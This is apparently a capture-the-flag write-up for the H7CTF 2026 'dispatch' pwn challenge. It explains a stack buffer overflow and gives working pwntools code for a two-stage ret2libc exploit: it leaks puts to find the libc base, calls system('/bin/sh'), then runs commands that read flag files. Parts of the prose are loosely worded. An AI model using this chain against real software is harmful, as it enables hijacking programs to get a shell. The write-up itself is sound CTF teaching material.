---
title: "Sparrow Freight Dispatch — Stack Overflow to ret2libc"
description: "This challenge's binary is dispatch; the banner inside it is what names it. H7CTF 2026's pwn track artifacts for the challenge are titled dispatch.zip, and the feedback terminal's prompt…"
event: "h7ctf"
category: "pwn"
categoryLabel: "Pwn"
tags: ["H7CTF 2026","pwn"]
date: "2026-10-22"
teammate: false
source: "H7CTF/test6/writeup.md"
---

This challenge's binary is `dispatch`; the banner inside it is what names it. H7CTF 2026's `pwn` track artifacts for the challenge are titled `dispatch.zip`, and the feedback terminal's prompt (`enter waybill number:`) plus `=== Sparrow Freight dispatch terminal ===` are the strings around it.

## The bug

The `dispatch` binary, running with libc `2.39-0ubuntu8.9`, reads a "waybill number" into a bounded but **unsafe** buffer: my exploit uses 72 bytes `b"A"*72` of pure padding, which is how I discovered the spot where an oversized waybill begins to smash saved registers locally. `elf.symbols` references in the exploit (`pop_rdi`, `main`) resolve SymTab entries published by the binary, and the exploit pops return addresses directly off the stack on entry.

```python
padding = b"A" * 72
ret = 0x40101A
pop_rdi = elf.symbols["pop_rdi_ret"]
```

## Round 1: libc leak

The first payload re-enters main after leaking:

```python
io.sendafter(b"enter waybill number:\n", padding + flat(ret, pop_rdi, elf.got["puts"], elf.plt["puts"], ret, elf.symbols["main"]))
```

Layout of the return chain after the buffer:

- `0x40101A` (a neutral `ret` gadget, for 16-byte stack alignment at the `system` boundary),
- `pop_rdi_ret` loads `puts@got`,
- `puts@plt` prints the 6-byte runtime address of `puts` (then a newline),
- `ret` again, then jump back into `main` for a fresh prompt.

The exploit then parses the leak with everything dropped before the banner:

```python
libc.address = u64(leak) - libc.symbols["puts"]
```

and says `log.success(f"libc base: {libc.address:#x}")`. Note that `leak` is `.ljust(8, b"\0")` — puts stops at the NUL in the pointer's 7th byte, so this rebuilds it precisely.

## Round 2: system("/bin/sh")

With `libc.address` set, `next(libc.search(b"/bin/sh\0"))` finds the string inside the now-rebased libc, and the second stage frames it as a classic ret2libc:

```python
io.sendafter(b"enter waybill number:\n", padding + flat(ret, pop_rdi, next(libc.search(b"/bin/sh\0")), libc.symbols["system"]))
```

Same alignment discipline (`ret` gadget first), then `pop rdi; ret` loads the string address and `system` takes over. Coupled with the second-stage command injection (`cat /flag /flag.txt ...`, then a `find / ... -iname '*flag*'` sweep), the shell dumps whatever flag file the instance uses.

## Flag

Flag: not recovered in the writeup. The exploit ends with `io.recvall(...)`, and no flag text was captured in the artifact scripts here.
